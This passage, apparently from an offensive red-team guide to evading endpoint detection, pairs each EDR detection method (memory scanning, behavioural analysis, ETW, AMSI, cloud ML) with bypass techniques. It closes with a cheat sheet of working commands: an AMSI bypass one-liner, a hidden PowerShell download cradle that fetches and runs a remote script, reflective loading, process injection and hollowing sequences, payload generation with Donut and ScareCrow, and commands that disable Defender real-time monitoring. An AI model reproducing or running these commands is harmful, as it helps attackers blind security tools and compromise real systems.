--------------------------------------------------------------------------------

How it works:
  - YARA rules on process memory
  - Periodic or event-triggered scans
  - Search for shellcode patterns, known tool memory signatures

Bypass:
  - Encrypt memory during sleep (section 9.4)
  - Use less-signatured shellcode
  - Reflective loading (no module in list)
  - Direct syscalls (avoid userland signatures)

--------------------------------------------------------------------------------
15.4 BEHAVIORAL ANALYSIS
--------------------------------------------------------------------------------

How it works:
  - Sequence-based: chain of events = malicious pattern
  - Example chain:
    Process create (cmd) -> child (powershell) -> download cradle
    -> VirtualAlloc(RWX) -> WriteProcessMemory -> CreateRemoteThread
    -> network connect to C2

Bypass:
  - Sleep between steps (break chain)
  - PPID spoofing (appear as benign parent)
  - Module stomping (code in legit DLL)
  - Use LOLBins (blend with admin activity)
  - Low-and-slow timing

--------------------------------------------------------------------------------
15.5 ETW-BASED DETECTION
--------------------------------------------------------------------------------

  - Microsoft-Windows-Threat-Intelligence: detects injection, AMSI
    bypass, ETW patching, LSASS access in real-time
  - Kernel ETW: process, thread, image, registry, network
  - CLR ETW: .NET assembly load, method JIT, reflection

Bypass:
  - Patch userland ETW (limited effectiveness)
  - Kernel ETW cannot be patched from userland
  - Reduce suspicious API usage
  - Use native code instead of PowerShell/.NET

--------------------------------------------------------------------------------
15.6 AMSI DETECTION
--------------------------------------------------------------------------------

  - Content-based: scans script text before execution
  - Provider: Defender or 3rd party AV
  - Blocks execution if signature match

Bypass:
  - AMSI bypass (section 4) - risky, signatured
  - String obfuscation (breaks signatures)
  - Custom tooling (not signatured)
  - Avoid PowerShell entirely

--------------------------------------------------------------------------------
15.7 CLOUD ML DETECTION
--------------------------------------------------------------------------------

How it works:
  - Behavior events sent to cloud
  - ML model analyzes sequences across processes, users, hosts
  - Detects anomalies even if each step is "normal"

Bypass:
  - Mimic normal admin behavior exactly
  - Use valid credentials (T1078)
  - Low-and-slow
  - Blend with business-hour activity
  - Avoid triggering high-fidelity signals (lsass, injection)

19. QUICK CHEAT SHEET
================================================================================

AMSI BYPASS (classic - educational):
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

ETW PATCH (concept):
  # Patch EtwEventWrite in ntdll with xor eax,eax; ret

POWERSHELL EVASION:
  powershell -nop -w hidden -enc <base64>
  IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')
  [Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)

INJECTION CONCEPTS:
  VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread (classic)
  Module Stomp: LoadLibrary -> overwrite DLL .text
  Process Hollow: CreateProcess(suspended) -> Unmap -> Write -> Resume

SYSWHISPERS3 DIRECT SYSCALL:
  mov r10, rcx
  mov eax, <SSN>
  syscall
  ret

DONUT (.NET -> shellcode):
  donut -f payload.exe -o payload.bin

SCARECROW (evasion payload):
  python3 Crow.py -p payload.exe -csharp -Amsi Bypass -Etwp Bypass

DEFENDER EXCLUSIONS (admin):
  Add-MpPreference -ExclusionPath "C:\Temp"
  Set-MpPreference -DisableRealtimeMonitoring $true

SLEEP OBFUSCATION (concept):
  encrypt(shellcode) -> sleep(jitter) -> decrypt -> execute

UNHOOKING (concept):
  Map \\KnownDlls\\ntdll.dll -> copy clean bytes over hooked ntdll

KEY TAKEAWAY:
  Runtime evasion is a layered game: static (AV signatures), dynamic
  (AMSI/ETW/hooks), and behavioral (EDR analytics). No single technique
  wins - combine multiple layers, use less-signatured methods, move
  slowly, and assume kernel-level detection is always watching.
